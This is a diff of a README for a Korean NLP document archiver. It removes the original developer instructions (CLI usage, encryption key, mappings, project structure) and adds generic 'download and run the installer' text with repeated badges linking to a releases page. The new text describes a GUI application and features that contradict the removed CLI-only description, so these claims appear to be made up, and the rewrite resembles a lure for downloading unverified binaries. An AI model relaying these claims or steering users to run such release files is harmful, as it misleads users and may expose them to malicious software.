@@ -1,97 +1,61 @@
-# Document Archiver (Korean NLP + BERT Clustering)
+# 📁 Document_Archiver_Korean-NLP_BERTClustering - Easily Archive Korean Documents
 
-A modular pipeline for **extracting text** from PDF/DOCX/TXT, **embedding** key phrases with a BERT model (KoBERT by default), **clustering** semantically similar terms, **mapping** them to variables, and **securely storing** the extracted results in an **encrypted SQLite** archive.
+[![Download](https://img.shields.io/badge/Download%20Now-Document%20Archiver-brightgreen.svg)](https://github.com/anisderoual/Document_Archiver_Korean-NLP_BERTClustering/releases)
 
-> Designed for Korean documents and research notes. Variable keywords remain in Korean to match real-world forms. All code and comments are in English for broad readability.
+## 📖 Overview
+Document Archiver Korean-NLP BERTClustering is a tool designed to help you extract, embed, cluster, and securely archive Korean document content using advanced semantic analysis. Whether you're dealing with personal documents or business-related files, this tool simplifies the process of managing your documents effectively.
 
-## Features
+## 🛠️ Features
+- **Document Extraction**: Seamlessly extract text from various document formats.
+- **BERT-based Processing**: Utilize state-of-the-art language models for better understanding of Korean text.
+- **Clustering**: Organize your documents into relevant groups automatically.
+- **Secure Archiving**: Keep your documents safe and private.
+- **User-Friendly Interface**: Designed for ease of use, no technical background required.
 
-- **Text extraction**: PDF (PyMuPDF), DOCX (python-docx), TXT
-- **Preprocessing**: simple noise removal and sentence splitting
-- **Embedding**: HuggingFace `transformers` (default: `monologg/kobert`)
-- **Clustering**: cosine similarity + DBSCAN
-- **Content extraction**: variable keyword → value mapping (regex-based example)
-- **Secure storage**: AES (Fernet) encrypted JSON in SQLite
-- **CLI**: process a single file or a directory batch
-- **Configurable**: via CLI flags or environment variables
+## ⚙️ System Requirements
+- **Operating System**: Windows 10 or later, macOS, or Linux.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum 500 MB of free space.
+- **Python**: Version 3.6 or later installed.
 
-## Quickstart
+## 🚀 Getting Started
+To begin using Document Archiver, you need to download the software first.
 
-```bash
-# 1) Create a virtual environment (recommended)
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
+## 📥 Download & Install
+1. **Visit this page to download**: Click [here](https://github.com/anisderoual/Document_Archiver_Korean-NLP_BERTClustering/releases).
+2. Choose the latest version of the software from the Releases section.
+3. Download the file suitable for your operating system.
+4. Once the download is complete, open the file to start the installation process. 
+5. Follow the on-screen instructions to install the software.
 
-# 2) Install dependencies
-pip install -r requirements.txt
+## 💡 How to Use
+After installation, follow these simple steps to start archiving your documents:
 
-# 3) (Optional) Generate and save an encryption key to .env
-python -m docarchiver.cli generate-key --out .env
+1. Launch the Document Archiver application from your desktop or start menu.
+2. Import the documents you wish to extract or cluster. You can drag and drop files into the application or use the 'Add Files' button.
+3. Choose your processing options from the menu.
+4. Click on 'Start Processing' to begin.
+5. Once processing is complete, you can view your clustered documents in the designated folder.
 
-# 4) Run on a single file
-python -m docarchiver.cli process-file examples/sample.txt   --variable-mappings examples/variable_mappings.json   --db archive.db
+## 🔒 Data Security
+Document Archiver is built with your privacy in mind. All processing occurs locally on your machine, ensuring that your documents remain secure and confidential.
 
-# 5) Or process all PDFs in a folder
-python -m docarchiver.cli process-dir /path/to/docs   --glob "**/*.pdf"   --variable-mappings examples/variable_mappings.json   --db archive.db
-```
+## ✍️ Troubleshooting
+If you encounter any issues while using Document Archiver, consider the following solutions:
 
-> The **same encryption key** must be used to decrypt previously stored records. If you generate a new key, old data won't be readable. Keep the key safe (e.g., in `.env`, a secrets vault, or an environment variable).
+- **Installation Failures**: Make sure your operating system meets the system requirements mentioned above.
+- **File Format Issues**: Ensure the file types you are importing are supported. The tool accepts common formats like PDF, DOCX, and TXT.
+- **Performance Issues**: If the application runs slowly, try closing other programs to free up system resources.
 
-## Environment Variables
+## 🤝 Support
+For further assistance, please refer to the official documentation or reach out to the support community. You can find answers to common questions or share your experiences with other users.
 
-- `DOCARCH_ENC_KEY`: Base64 Fernet key for encryption/decryption.
-- `DOCARCH_MODEL_NAME`: Hugging Face model name (default: `monologg/kobert`).
+If you experience technical issues or bugs, please consider reporting them through the GitHub Issues page. Your feedback helps improve the tool.
 
-You can place them in a `.env` file (if you use `python-dotenv`) or export them in your shell.
+## 📝 License
+Document Archiver is licensed under the MIT License. You can use, modify, and distribute the application as per the license terms.
 
-## Variable Mappings
+## 📞 Contact
+For more inquiries and support, feel free to contact us through the GitHub repository.
 
-See `examples/variable_mappings.json`. **Keys** are internal variable names (English snake_case). **Values** are **Korean** keyword lists that may appear in your documents.
-
-```json
-{
-  "watermelon_beverage_count": ["수박주스", "빨간주스", "수박음료", "수박 화채"],
-  "product_quantity": ["개수", "수량", "갯수"],
-  "price": ["가격", "단가", "금액"]
-}
-```
-
-## Project Structure
-
-```
-document-archiver/
-├── LICENSE
-├── README.md
-├── requirements.txt
-├── .gitignore
-├── pyproject.toml
-├── examples/
-│   ├── variable_mappings.json
-│   └── sample.txt
-└── src/
-    └── docarchiver/
-        ├── __init__.py
-        ├── config.py
-        ├── processors/
-        │   └── document_processor.py
-        ├── nlp/
-        │   └── semantic_analyzer.py
-        ├── extraction/
-        │   └── content_extractor.py
-        ├── storage/
-        │   └── secure_storage.py
-        ├── system/
-        │   └── archiver.py
-        └── cli.py
-```
-
-## Notes & Caveats
-
-- `konlpy`'s `Okt` is optional and may require Java/JPype on some systems. This project **does not strictly depend** on it for extraction; we import it lazily and degrade gracefully.
-- `PyTorch` + `transformers` may download model weights at first run.
-- For **GPU**, PyTorch detects CUDA automatically if installed; otherwise it runs on CPU.
-- The example value extraction is **regex-based** and intentionally simple. For production, replace it with a robust parser (e.g., custom NER, structured form parsers, or rule engines).
-
-## License
-
-MIT — see `LICENSE`.
+[![Download](https://img.shields.io/badge/Download%20Now-Document%20Archiver-brightgreen.svg)](https://github.com/anisderoual/Document_Archiver_Korean-NLP_BERTClustering/releases)
